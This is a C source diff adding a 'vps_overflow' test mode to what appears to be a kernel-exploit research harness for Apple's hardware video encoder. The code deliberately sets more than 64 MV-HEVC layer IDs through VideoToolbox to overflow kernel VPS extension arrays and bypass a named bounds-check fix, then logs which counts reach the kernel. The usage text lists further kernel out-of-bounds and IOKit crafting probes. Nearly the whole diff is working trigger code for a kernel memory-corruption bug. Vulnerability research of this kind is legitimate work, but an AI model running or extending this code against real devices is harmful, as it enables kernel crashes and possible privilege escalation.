@@ -3460,6 +3460,194 @@ cleanup_dummies:
         rlog("Properties accepting values > 255 without error are candidates\n");
         rlog("for kernel-side bounds check bypass (like NumberOfTemporalLayers).\n");
 
+    } else if (strcmp(mode, "vps_overflow") == 0) {
+        /*
+         * vps_overflow — KEY TEST: Set MVHEVCVideoLayerIDs with >64 entries
+         *
+         * Session 28 breakthrough: The fix (AVE_HEVC_CheckVPSExtBounds) adds
+         * bounds checks on VPS extension arrays (dim 64). If VideoToolbox
+         * doesn't validate layer count, >64 layers → kernel VPS extension
+         * array overflow during sAddClient.
+         *
+         * Tests layer counts: 32, 48, 64, 65, 72, 96, 128
+         * Reports which counts succeed at each pipeline stage.
+         */
+        rlog("=== VPS Extension Overflow Test ===\n");
+        rlog("Target: VPS extension arrays dim 64 in kernel\n");
+        rlog("Goal: Set >64 MV-HEVC layer IDs → overflow during sAddClient\n\n");
+
+        int test_layers[] = {2, 32, 48, 64, 65, 72, 96, 128};
+        int n_tests = sizeof(test_layers) / sizeof(test_layers[0]);
+        int w = 128, h = 128;
+
+        for (int t = 0; t < n_tests; t++) {
+            int nlayers = test_layers[t];
+            rlog("--- Testing %d layers ---\n", nlayers);
+
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
+                NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                kCFBooleanTrue);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("RequireHardwareAcceleratedVideoEncoder"),
+                kCFBooleanTrue);
+
+            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
+                encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+            if (st != noErr || !s) {
+                rlog("  VTCompressionSessionCreate FAILED: %d\n", (int)st);
+                continue;
+            }
+
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime,
+                kCFBooleanTrue);
+            int kf = 1;
+            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
+            VTSessionSetProperty(s,
+                kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
+            CFRelease(kfn);
+            VTSessionSetProperty(s,
+                kVTCompressionPropertyKey_AllowFrameReordering,
+                kCFBooleanFalse);
+
+            /* Build layer ID array: [0, 1, ..., nlayers-1] */
+            CFNumberRef *layer_nums = calloc(nlayers, sizeof(CFNumberRef));
+            CFTypeRef *layer_ptrs = calloc(nlayers, sizeof(CFTypeRef));
+            for (int i = 0; i < nlayers; i++) {
+                layer_nums[i] = CFNumberCreate(NULL, kCFNumberIntType, &i);
+                layer_ptrs[i] = layer_nums[i];
+            }
+            CFArrayRef layer_arr = CFArrayCreate(NULL, layer_ptrs, nlayers,
+                &kCFTypeArrayCallBacks);
+
+            OSStatus sp1 = VTSessionSetProperty(s,
+                kVTCompressionPropertyKey_MVHEVCVideoLayerIDs, layer_arr);
+            rlog("  MVHEVCVideoLayerIDs(%d): %d\n", nlayers, (int)sp1);
+
+            OSStatus sp2 = VTSessionSetProperty(s,
+                kVTCompressionPropertyKey_MVHEVCViewIDs, layer_arr);
+            rlog("  MVHEVCViewIDs(%d): %d\n", nlayers, (int)sp2);
+
+            /* LeftAndRightViewIDs: only use first 2 for stereo */
+            if (nlayers >= 2) {
+                CFArrayRef lr_arr = CFArrayCreate(NULL, layer_ptrs, 2,
+                    &kCFTypeArrayCallBacks);
+                OSStatus sp3 = VTSessionSetProperty(s,
+                    kVTCompressionPropertyKey_MVHEVCLeftAndRightViewIDs,
+                    lr_arr);
+                rlog("  MVHEVCLeftAndRightViewIDs: %d\n", (int)sp3);
+                CFRelease(lr_arr);
+            }
+
+            VTSessionSetProperty(s,
+                kVTCompressionPropertyKey_HeroEye, CFSTR("left"));
+            VTSessionSetProperty(s,
+                kVTCompressionPropertyKey_HasLeftStereoEyeView,
+                kCFBooleanTrue);
+            VTSessionSetProperty(s,
+                kVTCompressionPropertyKey_HasRightStereoEyeView,
+                kCFBooleanTrue);
+            VTSessionSetProperty(s,
+                kVTCompressionPropertyKey_ProfileLevel,
+                kVTProfileLevel_HEVC_Main10_AutoLevel);
+
+            CFRelease(layer_arr);
+            for (int i = 0; i < nlayers; i++) CFRelease(layer_nums[i]);
+            free(layer_nums);
+            free(layer_ptrs);
+
+            /* Try PrepareToEncodeFrames — this triggers sAddClient in kernel */
+            st = VTCompressionSessionPrepareToEncodeFrames(s);
+            rlog("  PrepareToEncodeFrames: %d\n", (int)st);
+
+            if (st == noErr) {
+                /* Try a single encode */
+                g_encode_done = 0;
+                g_cb_status = -999;
+                g_last_pset_count = 0;
+                g_last_pset_total_bytes = 0;
+
+                /* Create stereo buffer pair */
+                CVPixelBufferRef pb0 = create_yuv_pb_stereo(w, h, 0x40);
+                CVPixelBufferRef pb1 = create_yuv_pb_stereo(w, h, 0x60);
+
+                if (pb0 && pb1 && VTCompressionSessionEncodeMultiImageFrame) {
+                    CMTag t0[2] = { kCMTagStereoLeftEye,
+                        CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 0) };
+                    CMTag t1[2] = { kCMTagStereoRightEye,
+                        CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 1) };
+
+                    CMTagCollectionRef tc0 = NULL, tc1 = NULL;
+                    CMTagCollectionCreate(NULL, t0, 2, &tc0);
+                    CMTagCollectionCreate(NULL, t1, 2, &tc1);
+
+                    CFMutableArrayRef tcArr = CFArrayCreateMutable(NULL, 2,
+                        &kCFTypeArrayCallBacks);
+                    CFMutableArrayRef bArr = CFArrayCreateMutable(NULL, 2,
+                        &kCFTypeArrayCallBacks);
+                    CFArrayAppendValue(tcArr, tc0);
+                    CFArrayAppendValue(tcArr, tc1);
+                    CFArrayAppendValue(bArr, pb0);
+                    CFArrayAppendValue(bArr, pb1);
+
+                    CMTaggedBufferGroupRef grp = NULL;
+                    CMTaggedBufferGroupCreate(NULL, tcArr, bArr, &grp);
+                    CFRelease(tcArr); CFRelease(bArr);
+                    CFRelease(tc0); CFRelease(tc1);
+
+                    if (grp) {
+                        CMTime pts = CMTimeMake(0, 30);
+                        CMTime dur = CMTimeMake(1, 30);
+                        CFMutableDictionaryRef fp = CFDictionaryCreateMutable(
+                            NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                            &kCFTypeDictionaryValueCallBacks);
+                        CFDictionarySetValue(fp,
+                            kVTEncodeFrameOptionKey_ForceKeyFrame,
+                            kCFBooleanTrue);
+
+                        st = VTCompressionSessionEncodeMultiImageFrame(
+                            s, grp, pts, dur, fp, NULL, NULL);
+                        rlog("  EncodeMultiImageFrame: %d\n", (int)st);
+                        CFRelease(fp);
+                        CFRelease(grp);
+
+                        for (int ww = 0; ww < 500 && !g_encode_done; ww++)
+                            usleep(10000);
+                        rlog("  Callback: status=%d psets=%zu bytes=%zu\n",
+                            (int)g_cb_status, g_last_pset_count,
+                            g_last_pset_total_bytes);
+                    }
+                } else if (pb0) {
+                    /* Fallback: standard single-image encode */
+                    encode_one(s, 0, w, h);
+                    for (int ww = 0; ww < 500 && !g_encode_done; ww++)
+                        usleep(10000);
+                    rlog("  Encode: status=%d psets=%zu bytes=%zu\n",
+                        (int)g_cb_status, g_last_pset_count,
+                        g_last_pset_total_bytes);
+                }
+                if (pb0) CVPixelBufferRelease(pb0);
+                if (pb1) CVPixelBufferRelease(pb1);
+            }
+
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+
+            rlog("  RESULT: %s\n\n",
+                (sp1 == noErr && st == noErr) ? "PASSED through pipeline" :
+                (sp1 != noErr) ? "REJECTED at VTSessionSetProperty" :
+                "REJECTED at PrepareToEncodeFrames");
+        }
+
+        rlog("If any test with >64 layers passed through PrepareToEncodeFrames,\n");
+        rlog("the kernel VPS extension arrays may have overflowed.\n");
+        rlog("Check dmesg/syslog for kernel panics or assertions.\n");
+
     } else if (strcmp(mode, "multi_layer") == 0) {
         /*
          * multi_layer — Create MV-HEVC encoder with N layers (not just 2)
@@ -4274,6 +4462,7 @@ cleanup_dummies:
         rlog("  enum_properties                -- Enumerate ALL supported encoder properties and boundary test\n");
         rlog("  multi_layer [max]              -- MV-HEVC with N layers: measure pset scaling\n");
         rlog("  counter_accumulate [enc] [stereo] -- KEY TEST: 300 keyframes, monitor kernel OOB at 86+\n");
+        rlog("  vps_overflow       -- KEY: Set >64 MV-HEVC layers to overflow kernel VPS arrays\n");
         rlog("  iokit_vps [phase]  -- Direct IOKit probe: enumerate AVE service + craft VPS\n");
         rlog("  iokit_enum         -- Enumerate all IOKit video encoder services\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
